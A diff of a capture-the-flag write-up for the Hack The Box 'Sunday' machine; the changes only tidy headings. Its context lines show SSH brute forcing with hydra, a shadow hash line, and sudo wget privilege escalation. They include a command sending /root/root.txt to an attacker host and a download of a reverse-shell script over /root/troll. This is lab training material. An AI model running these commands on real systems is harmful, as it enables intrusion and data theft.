@@ -66,7 +66,7 @@ cat /usr/share/seclists/Usernames/Names/names.txt | ForEach-Object -Parallel { $
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/edfc743d-7113-4830-94f0-979bf6bbd8b6)
 
 
-## Gaining Access:
+## Gaining Access
 + SSH is open, and there are 2 valid usernames: **sammy** and **sunny**
 + Brute force the users' credentials using hydra.
 ```
@@ -147,7 +147,7 @@ sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
 
 ## Privilege Escalation: from 'sammy' to 'root'
 
-### Method 1:
+### Method 1
 + Run `sudo -ll` command to view the list of allowed commands the user can run as root.
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/36f1c0e0-6503-4515-8f63-25179f3be8b4)
@@ -166,13 +166,13 @@ sudo wget --use-askpass=$TF 0
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/4e469a93-aad2-4338-a806-18c7ae8d33c1)
 
 
-### Method 2:
+### Method 2
 + On **sammy**'s session, send **root.txt** to your kali attack vm: `sudo wget --post-file /root/root.txt http://10.10.14.8:5555/`
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/04c2786a-bd1c-4846-b1e3-660ffdaa24ed)
 
 
-### Method 3:
+### Method 3
 + On **sunny**'s session, view the list of allowed commands that the user can run with root privileges: `sudo -ll`
 + We don't have write access to the script, so we can't escalate our privileges using it.
 
@@ -211,7 +211,7 @@ sudo wget http://10.10.14.8:8000/rev_shell.py -O /root/troll
 + **Overwrite troll with '/bin/bash' or 'cat /root/root.txt'**, **Overwrite Different SUID Binary**, **Overwrite shadow**, and **Overwrite sudoers** methods.
 + **The logic here is that wget, which works with root privileges, assigns root permissions to the files it downloads or overwrites.**
 
-# References & Alternatives:
+# References & Alternatives
 + https://vvmlist.github.io/#poison
 + https://0xdf.gitlab.io/2018/09/29/htb-sunday.html
 + https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/linux-boxes/sunday-writeup-w-o-metasploit
@@ -221,5 +221,5 @@ sudo wget http://10.10.14.8:8000/rev_shell.py -O /root/troll
 + https://medium.com/@joemcfarland/hack-the-box-sunday-writeup-c2dcee3593d8
 + https://medium.com/ctf-writeups/sunday-write-up-htb-c5993ba78c9
 
-# More:
+# More
 + **Pentesting Finger:** https://book.hacktricks.xyz/network-services-pentesting/pentesting-finger
